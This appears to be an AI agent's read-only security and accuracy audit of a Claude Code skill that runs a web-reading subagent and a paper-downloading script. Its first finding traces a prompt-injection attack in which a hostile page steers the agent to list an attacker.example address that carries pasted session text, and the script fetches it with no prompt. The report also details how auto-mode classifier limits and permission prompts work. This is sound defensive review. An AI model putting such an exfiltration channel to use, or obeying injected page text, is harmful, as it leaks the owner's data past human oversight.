# Round 3 research report: `skills/deepthink/SKILL.md`

This covers fingerprint `sha256:26222c3c78ba37f326c9d9c7f7fefd608600a92cc085621c975f293d24d27d91`, read on 2026-10-02. The work was read-only and edited no file.

**Main result.** Round 3 found four problems that matter, all new (none of them is in rounds 1–2 or among the 14 entries in the owner list):

1. **The paper list is a way out of the machine that no permission prompt covers.** The program requests every listed address from the owner's machine, and the owner never sees those addresses.
2. **"No other tool" is no longer true in auto mode.** Claude Code now also gives the reading agent a report-handback tool that is not in its `tools:` line.
3. **The reading agent's 80-turn limit is a likely way to lose a run.** At the limit its output comes back marked partial. Today the skill throws that work away and launches a fresh run, which will probably hit the same limit.
4. **One sentence about the index is false according to the program's own code.** The program does not remove the direction marks U+200E, U+200F and U+061C from table cells, but the skill says cells hold none.

Every other dependency re-read raw shows no drift. Points 2 and 3 involve sentences the test pins, so the pinned wording stays and those parts go to the owner.

---

## (a) Queries

1. Web search: `joint guidance agentic AI security 2026 CISA NSA ASD NCSC AI agents web browsing prompt injection`. Source class: regulator. Only secondary results came back, which led to query 2.
2. Web search: `"Careful adoption of agentic AI services"`, limited to cisa.gov, cyber.gov.au, ncsc.gov.uk, media.defense.gov, cyber.gc.ca and ncsc.govt.nz. Source class: regulator.
3. Raw page re-reads for drift, searched in the saved raw text or asked narrowly: `permission-modes.md`, `tools-reference.md`, `sub-agents.md`, `data-usage.md`, `permissions.md`, `hooks.md`. Source class: vendor documentation.
4. Node documentation: `packages.md` and `globals.md` (raw from GitHub); undici `Fetch.md`. Source class: vendor documentation.
5. Standards: RFC 8118 (`.txt`); Unicode Standard Annex number 9 (the bidirectional algorithm). Source class: standards body.
6. arXiv help: `robots.html`. Source class: publisher.
7. The OWASP 2026 prompt-injection entry (`LLM01:2026`), raw. Source class: standards body.

## (b) Sources (all read 2026-10-02)

| Address | What it bore on | Outcome | Quote |
|---|---|---|---|
| https://code.claude.com/docs/en/permission-modes.md (raw, searched in full) | Auto mode's starting version and conditions; the order rules and the classifier are applied in; block thresholds; review of subagents; what is allowed by default | supported | "With Claude Code v2.1.283 or later, auto mode is the built-in starting permission mode for interactive terminal and VS Code sessions." / "if the classifier blocks an action 3 times in a row or 20 times total, auto mode pauses and Claude Code resumes prompting" / "**Allowed by default**: … Read-only HTTP requests" / "When the classifier flags the subagent's work or report, or a separate API safety check refuses the review, the report is still delivered, prepended with a security warning. When the classifier is unavailable for the review, the report arrives with a note to verify the subagent's work before acting on it." |
| https://code.claude.com/docs/en/tools-reference.md (raw, searched in full) | WebFetch behaviour; the shell tool moving commands to the background; turn limits; permission prompts from background subagents; the report-handback tool | supported, plus **new: refutes "no other tool"** | "Where the conditions in the `SubagentHandback` tools-table entry hold, Claude Code also gives the subagent that tool, even if you leave it out of `tools` or list it in `disallowedTools`." / "`SubagentHandback` \| Delivers a subagent's final report to whichever conversation receives that subagent's result. Provided only in auto mode, to subagents that the Agent tool runs locally other than forks … the classifier reviews the report before it's delivered. Requires Claude Code v2.1.271 or later" / "When the subagent reaches the limit, Claude Code marks the returned result as partial output, and Claude can resume the subagent to continue." / "The `auto` and `bypassPermissions` permission modes skip the prompt, except for a domain an explicit `ask` rule matches." |
| https://code.claude.com/docs/en/sub-agents.md (through the fetch tool's answer) | Agent naming inside a plugin; the turn limit; resuming a subagent; the Task-to-Agent rename | supported | "a file at `agents/review/security.md` in plugin `my-plugin` registers as `my-plugin:review:security`" / "The partial marking requires Claude Code v2.1.246 or later" / "Claude uses the `SendMessage` tool with the agent's ID or name as the `to` field to resume it." / "In version 2.1.63, the Task tool was renamed to Agent." |
| https://code.claude.com/docs/en/data-usage.md (the whole section came back) | WebFetch's domain safety check | supported | "Before fetching a URL, the WebFetch tool sends the requested hostname to `api.anthropic.com` to check it against a safety blocklist maintained by Anthropic. Only the hostname is sent, not the full URL, path, or page contents." |
| https://code.claude.com/docs/en/permissions.md (raw) | How long a "don't ask again" answer lasts, per tool | supported | "Web fetch \| WebFetch \| Yes, except a built-in set of preapproved documentation domains \| Permanently per repository and domain" / "Web search \| WebSearch \| Yes \| Permanently per repository" / "Bash commands \| … \| Permanently per repository and command" |
| https://code.claude.com/docs/en/hooks.md (through the fetch tool's answer) | Whether the launch-fence matcher `Task` matches the Agent tool | did not bear (no drift) | "`Bash` matches only the Bash tool"; the page says nothing about Task as an alias in matchers. The owner entry `h-deepthink-r1-launch-fence-matcher` stands unchanged. |
| https://raw.githubusercontent.com/nodejs/node/main/doc/api/packages.md (fetch tool's answer) | The `.cjs` sentence | supported | "Files ending with `.cjs` are always loaded as CommonJS regardless of the nearest parent `package.json`." |
| https://raw.githubusercontent.com/nodejs/node/main/doc/api/globals.md (fetch tool's answer) | The sixty-second limit; whether the body is counted after decompression | supported for the limit; did not bear on decompression | "Returns a new `AbortSignal` which will be aborted in `delay` milliseconds." |
| https://raw.githubusercontent.com/nodejs/undici/main/docs/docs/api/Fetch.md | Decompression | did not bear | (the answer said the page does not cover it, which is not evidence of absence) |
| https://www.rfc-editor.org/rfc/rfc8118.txt | The `%PDF` header | supported | "All PDF files start with the characters "%PDF-" followed by the PDF version number" |
| https://www.unicode.org/reports/tr9/ (revision 52, 2026-09-01; fetch tool's answer) | The index-cell sentence | **refutes it, together with the code** | Section 2.6: LRM "U+200E", RLM "U+200F", ALM "U+061C", each described as a "zero-width character" |
| https://info.arxiv.org/help/robots.html | Drift in the owner entry on download pace | supported, no drift | "Indiscriminate automated downloads from this site are not permitted" / "Continued rapid-fire requests from any site after access has been denied (i.e. with `403: Access denied` HTTP response) will be interpreted as an attack" |
| https://raw.githubusercontent.com/GenAI-Security-Project/GenAI-LLM-Top10/main/2026/final/LLM01_PromptInjection.md (fetch tool's answer) | Data leaving through an address; showing the exact action to a person | supported | "The model inserts a markdown image whose URL exfiltrates the private conversation to an attacker-controlled domain." / "Require explicit human confirmation before any privileged, irreversible, or externally visible action, surfacing the exact rendered action rather than a summary to the reviewer." |
| https://www.cyber.gc.ca/en/guidance/careful-adoption-agentic-ai (fetch tool's answer; joint guidance from the Canadian Centre for Cyber Security, the Australian Signals Directorate's cyber centre, CISA, NSA and the UK and New Zealand cyber centres) | Data leaving through a web-reading agent's tools | supported | "Malicious or compromised agents could use tools as a stealthy way to exfiltrate data." / "External data sources such as a web search can insert additional information into the prompt context, enabling indirect prompt injection attacks." |
| https://www.cyber.gov.au/…/careful-adoption-of-agentic-ai-services | The same guidance | unreachable | error: "timeout of 60000ms exceeded" |
| https://media.defense.gov/2026/Apr/30/2003922823/-1/-1/0/CAREFULADOPTIONOFAGENTICAISERVICES_FINAL.PDF | The same guidance as a PDF | unreachable | error: "HTTP 403 Forbidden" |

No fetched page contained a directive aimed at the reader.

## (c) Verdicts on every citation-shaped claim in the current file

| Line | Claim | Verdict | Evidence |
|---|---|---|---|
| 53 | agent type `ctoc:ai-quality:deepthink-researcher` | VALIDATED | sub-agents: "registers as `my-plugin:review:security`" |
| 55 (pinned) | "holds WebSearch and WebFetch and no other tool" | **STALE** in auto mode on 2.1.271 or later | tools-reference, the `SubagentHandback` quotes above. The second half ("cannot read a local file, write a file, run a command or launch an agent") still holds. |
| 60 | a request "an older Claude Code refuses without asking" | VALIDATED | tools-reference: "Before v2.1.186, background subagents auto-denied any tool call that would otherwise prompt" |
| 60 | no prompt for preapproved documentation sites, or after "don't ask again", which lasts for the repository | VALIDATED | permissions table rows quoted above |
| 60 | auto mode by default from 2.1.283 on, model supports it, organization has not turned it off | VALIDATED | permission-modes lines 11, 56 and 305 of the raw text |
| 60 | an allow or deny rule settles a request, an ask rule still asks, the classifier reviews the rest | VALIDATED | tools-reference "skip the prompt, except for a domain an explicit `ask` rule matches"; permission-modes "resolve immediately … Everything else goes to the classifier". Labelled inference: WebFetch is not one of the "Read-only" actions that are approved automatically, because the permissions table lists that type as "File reads, Grep". |
| 60 | prompting resumes after 3 blocks in a row or 20 in the session | VALIDATED | permission-modes: "3 times in a row or 20 times total"; "The total counter persists for the session" |
| 60 | the classifier reviews the brief at launch, the work and the report; security warning; note to verify | VALIDATED | permission-modes, the subagent section quoted above |
| 61 | WebFetch refuses `localhost` and host names without a dot | VALIDATED | tools-reference: "WebFetch refuses `localhost` and any other hostname without a dot … before making a request." |
| 61 | a refusal of private addresses is documented only for Monitor | VALIDATED (raw text, searched) | "Claude Code denies URLs that point at a private, link-local, or cloud-metadata address" appears only under the Monitor tool |
| 61 | the domain safety check sends only the host name | VALIDATED | data-usage, quoted above |
| 61 | the classifier allows read-only web requests by default | VALIDATED | "Read-only HTTP requests" |
| 74 | the work-dispatch rule in CTOC's dashboard instructions | VALIDATED (internal) | `src/commands/start.md` line 388: "WORK dispatch is record-first" |
| 122 | WebFetch reports a redirect to another host instead of following it | VALIDATED | "When a URL redirects to a different host, WebFetch returns a text result that names the original URL and the redirect target instead of following it." |
| 134 | WebFetch answers through a separate model call | VALIDATED | "Claude receives the result of that call rather than the raw page" |
| 110, 249 | the decision-question format's section headings | VALIDATED (internal) | `skills/ask-me-questions/SKILL.md` lines 95, 131, 146 and 160 |
| 150 | matrix 129 characters wide, column widths 20, 38, 38 and 28 | VALIDATED (internal) | parent plan line 349; 20 + 38 + 38 + 28 + 5 border characters = 129 |
| 200–201 | `.cjs` runs as CommonJS | VALIDATED | packages.md, quoted above |
| 205 | sixty seconds per download, redirects included | VALIDATED | program lines 16 and 71, plus the globals quote |
| 205 | 104,857,600 bytes | VALIDATED (arithmetic and code line 14). "Counted after decompression" was **not re-verified** this round. | |
| 206 | starts with `%PDF` and is larger than 51,200 bytes | VALIDATED | RFC 8118; program line 270 |
| 210 | the program's printed lines | VALIDATED against the code | lines 235–289 |
| 220 | the shell tool may move a command that hits its time limit into the background | VALIDATED | "When a foreground command reaches its timeout without finishing, Claude Code moves it to the background instead of stopping it, unless the command starts with `sleep`." |
| 227–228 | "Table cells hold no line break, control character, zero-width character or direction mark" | **FABRICATED** (contradicted by the code) | Program lines 103–106 cover the ranges 0x200b–0x200d, 0x2060 and 0x202a–0x202e, but **not** U+200E, U+200F or U+061C. Unicode Standard Annex 9, section 2.6, names those three as direction marks, each a "zero-width character". Believed but not read this round: U+FEFF (zero-width no-break space) and U+2028 and U+2029 (line and paragraph separators) also get through. |
| 252 | "the one exception this skill adds" (round 2's not-yet-re-verified wording) | VALIDATED (internal) | The format's line 144 names its own single exception, so the two do not conflict |
| 48, 265, 270 | the owner's dated rulings | already handled (round 2, owner entry `r2-h3`); program line 214 holds the 2 October ruling | |
| 202, 203 (pinned) | the "never requested" sentence; the benchmark range | already reported (`h-deepthink-r1-check-and-connect-lookups`, `h-deepthink-r2-version-six-benchmark-range`); the code is unchanged | |

## (d) Candidate improvements

### 1. The paper list is a way out that no prompt covers (medium; in scope, plus an item for the owner)

**Attack trace.**
- A hostile page steers the reading agent to list `{"url":"https://attacker.example/<pasted ruling words>.pdf", "topic":"x", "file":"y", …}`.
- The session writes that into the staging file with the Write tool. That is a file edit in the working directory, so auto mode approves it without the classifier.
- `fetch-papers.cjs` then runs its checks. `isHttps` passes, `hasCredentials` fails, `isName` passes, and `isInternalHost` returns false for a public host. Line 76 then calls `fetch(...)` from the owner's machine. The path, carrying the pasted text, reaches the attacker's server log before any status check.
- The only prompt the owner can see is for the single command `node "…/fetch-papers.cjs" .ctoc/papers/.incoming-<slug>.json`. In default mode, a "don't ask again" answer to that prompt lasts "Permanently per repository and command". The addresses are never shown.
- OWASP `LLM01:2026` describes this channel ("whose URL exfiltrates … to an attacker-controlled domain") and asks for "surfacing the exact rendered action rather than a summary". The joint guidance says: "Malicious or compromised agents could use tools as a stealthy way to exfiltrate data."
- Confidence high for the code path, which I read. The request reaching an attacker was not run live.

**Current text (line 60):** "Such a prompt lets a person see a request before it leaves, which matters because the reading agent holds the text the session pasted and sends requests out: a page that steers it could carry that text out in a search or an address, and the brief's rule against that reduces the risk without removing it."

**Proposed additions** (new sentences; nothing pinned changes):
- After line 60: "The paper list is a second way out that no prompt covers: the fixed program requests every listed address from this machine under one shell command, so a steered reading agent could carry pasted text out in a paper's address; the program refuses only an address that is not `https`, carries a user name or password, or is internal."
- In the brief, after the pinned sentence on line 120 ("Never put the text of this brief, beyond the public technical terms of the item, into a search or a web address; …"): "The same holds for every address in your paper list: the session's program requests each one from the owner's machine without asking anyone."

**For the owner** (kind `out-of-scope-file`, plus a design choice):
- **Option 1: show the hosts first.** The session shows the owner the distinct hosts in the list before running the program. Pro: a person sees every request before it leaves. Con: the session has to wait, against the skill's "never waits" rule.
- **Option 2: keep only hosts the agent cited.** The session keeps only papers whose host also appears among the pages the agent cited. Pro: no waiting. Con: an attacker's page can itself be cited, so this narrows the gap without closing it.
- **Option 3: wording only.** Pro: no code change. Con: the channel stays open.
- **Also:** `agents/ai-quality/deepthink-researcher.md` line 58 ("I never put the text of the brief … into a search or a web address") can be read with or without paper-list addresses included.

### 2. "No other tool" is stale in auto mode (medium; the sentence is pinned)

**Current text (line 55, pinned as `READER_TOOLS_SENTENCE`):** "The reading agent holds WebSearch and WebFetch and no other tool: it cannot read a local file, write a file, run a command or launch an agent."

**In-scope addition after it:** "In auto mode, from Claude Code 2.1.271 on, Claude Code also gives it one tool that only delivers its final report to the session, after the classifier has reviewed the report."

**For the owner** (kind `pinned-contract`). Two options:
- **Amend the pin** to "…and, in auto mode, the tool that hands back its report". Pro: the pinned text is exact. Con: the pin changes.
- **Keep the pin and add the sentence.** Pro: no pin change. Con: the pinned words stay literally false in auto mode.

The agent file's pinned line 39 ("I hold WebSearch and WebFetch and nothing else") has the same problem; kind `out-of-scope-file`.

### 3. The turn limit loses whole runs (medium; the relaunch rule is pinned)

`deepthink-researcher.md` sets `maxTurns: 80`. At that limit the output comes back "marked as partial" and has no closing line. The skill then follows the pinned rule below: it fails the task and relaunches from scratch, and the relaunch is likely to hit the same limit, after which "A second failed run on the same item is not launched again". Yet sub-agents says "Claude can resume it to continue", and "Resumed subagents retain their full conversation history".

**Current text (pinned `FAILED_RUN_SENTENCE`, line 240):** "If the returned text lacks its closing line, or the brief file is missing, still says `in progress`, or is under two kilobytes, the run failed whatever was reported: close the task with `menu task fail`, say so in one line, and launch it again with the same slug, starting again from recording the run; never announce it as finished."

**In-scope addition to the brief** (before item 5, "5. End with this exact line and nothing after it: `End of deepthink research: <slug>`"): "Your run ends after a fixed number of turns, and a result cut off there is thrown away: stop searching and fetching while enough turns remain to write the whole result, the paper list and the closing line."

**For the owner** (kind `pinned-contract`). Three options:
- **Resume once.** When the output is marked partial at the turn limit, resume the same agent once with `SendMessage`, asking it to write the result from what it has read, before counting the run as failed. Pro: keeps the research. Con: changes the pin and how the record-first rule applies to a resume.
- **Keep fresh relaunches.** Pro: no change. Con: a run that is too long fails twice.
- **Raise `maxTurns`** in the agent file. Pro: fewer partial results. Con: longer, more expensive runs, and the agent file is outside this slice.

### 4. The index-cell sentence is false according to the code (critical by verdict; practical impact low)

**Current text (lines 227–228):** "Table cells hold no line break, control character, zero-width character or direction mark, and escape the backslash, …"

**Proposed correction** (not pinned, so in scope): "Table cells hold no line feed, carriage return or other control character, no zero-width space, joiner or word joiner, and no direction embedding, override or isolate, variation selector or tag character, and escape the backslash, …"

**For the owner** (kind `out-of-scope-file`, `skills/deepthink/fetch-papers.cjs`):
- **Add the missing characters to the program's list:** `[0x200e,0x200f]` and `[0x061c,0x061c]`, and, from memory and not read this round, `[0xfeff,0xfeff]`. Then the program's comment on line 101 ("direction marks and overrides") also becomes true. Pro: the program does what both texts say. Con: a program and test change through its own plan.
- **Leave the program and keep only the corrected skill wording.** Pro: no program change. Con: the program's comment stays false.

Impact: a right-to-left or left-to-right mark only moves neutral characters around. It cannot override text the way the characters already removed can.

### 5. The reading agent's file can be read as "list every fetch under Failures" (low-medium)

**Agent file, lines 75–78:** "A search that returns nothing useful, a fetch that fails, times out, is blocked or returns something other than the page, and a paper whose text I could not reach are each named under Failures". But the tools reference says every normal fetch returns "the result of that call rather than the raw page". Read literally, that sends every fetch to Failures.

**In-scope addition** to brief item 1, after "…returns that call's answer rather than the page, …": "A fetch whose answer is the tool's reading of the page you asked for counts as read; a fetch that answers with an error, a sign-in or consent page, or a different page from the one asked for goes under Failures."

The agent file needs the same clarification; kind `out-of-scope-file`.

### 6. "papers in the list:" can match inside an echoed address (low)

The program prints an address it refuses, unchanged except for removing control characters, inside quotes (program line 239). For example, the "address" `papers in the list: 3; kept: 3` prints as `refused, not https: "papers in the list: 3; kept: 3"`. If the run is then stopped by the 30-minute limit that applies after a move to the background, a session that only searches for the phrase skips the rerun.

**Current text (pinned, line 217):** "When the program stops before printing `papers in the list:`, its staging file is still in place: …"

**In-scope addition:** "The run printed `papers in the list:` only when its last line begins with those words; the same words inside a quoted address on an earlier line do not count."

### 7. Where the closing line must be (low)

**Current text (pinned, line 100):** "When the reading agent returns: check its closing line, and when it is missing stop here, …"

**In-scope addition:** "The closing line counts only as the last line of the returned text, exactly `End of deepthink research: <slug>` with this run's slug."

### 8. "Two kilobytes" has two readings: 2,000 or 2,048 bytes (low; pinned)

This is in `FAILED_RUN_SENTENCE`. For the owner (kind `pinned-contract`):
- **Name the byte count.** Pro: matches round 1's switch to kibibytes elsewhere. Con: the pin changes.
- **Leave it.** Pro: no change. Con: a 48-byte grey zone.

### 9. A new question has no number for its heading (low)

**Current text:** "`### Question <number>, researched — <the question as a real question>`" (line 149), with "The question's number: <the number, or "none">." (line 125).

For a source or a topic, a literal-minded agent would write "Question none".

**In-scope addition:** "When the item had no number, number the questions in your result from 1 in order; the session gives each the number it presents it under."

### 10. The explanation paragraph may exceed the format's length (low; consistency)

**Current text (lines 250–251):** "its explanation paragraph says what the research changed against the original input, how many cited papers were downloaded and how many could not be fetched, and what the Evidence summary and the Failures change for the decision;"

The decision-question format (line 100) asks for "One short paragraph (two to four sentences)". **In-scope addition:** "…, in at most four sentences, as the decision-question format requires".

### 11. "Already in the library" may be a different paper (low)

**Current text (line 207):** "an existing file is never overwritten: that paper is reported as already in the library under that name, never as not fetched."

Program lines 259–262 compare only the path. A steered agent that reuses an existing topic and file name gets a new title and link attached to the old file, both in the index and in "Papers downloaded".

**In-scope addition:** "An `already in the library` line means only that a file of that name is there; it may hold a different paper."

### 12. The agent file names the wrong address (low; other file)

`deepthink-researcher.md` line 85 lists a paper by "its `https` address". The brief requires "the address of the paper's file itself". Kind `out-of-scope-file`.

### Checked and found consistent

I checked the skill against the decision-question format, the reading agent's order and rules, the program, and every pinned test string. All pinned strings are present in the current file. I checked this by reading, not by running the test.

## (e) Not reached

- **The joint guidance in primary form.** The Australian page timed out and the defense.gov PDF returned 403. The Canadian page came only through the fetch tool's answer. So that guidance's own words on whether prompt injection can be fully prevented were not read; it backs nothing in the file this round.
- **"Counted after decompression."** Node's globals page and undici's `Fetch.md` both came back without it. This is believed from the code's use of `response.body` and still needs a primary source.
- **Not re-read this round, with no drift expected:** Microsoft's device-name page, the IANA registries, NIST's binary prefixes, arXiv `robots.txt`, and RFC 9110.
- **Two outcomes inferred from documentation and code, not run:** whether WebFetch goes to the classifier in auto mode (inferred from the permissions table), and whether candidate 1's request actually reaches an attacker (inferred from the code).

**Files read:**
- `<home>/Code/ctoc/skills/deepthink/SKILL.md`
- `<home>/Code/ctoc/skills/deepthink/fetch-papers.cjs`
- `<home>/Code/ctoc/agents/ai-quality/deepthink-researcher.md`
- `<home>/Code/ctoc/skills/ask-me-questions/SKILL.md`
- `<home>/Code/ctoc/tests/deepthink-ships-with-ctoc.test.js` (lines 249–533)
- `<home>/Code/ctoc/.ctoc/audit/deepthink-improvement/skills/deepthink/SKILL.md.json`
- `<home>/Code/ctoc/.ctoc/audit/deepthink-improvement/for-the-human.json`
- `<home>/Code/ctoc/plans/in-progress/00399-deepthink-ships-with-ctoc-s3-three-improvement-rounds.md`
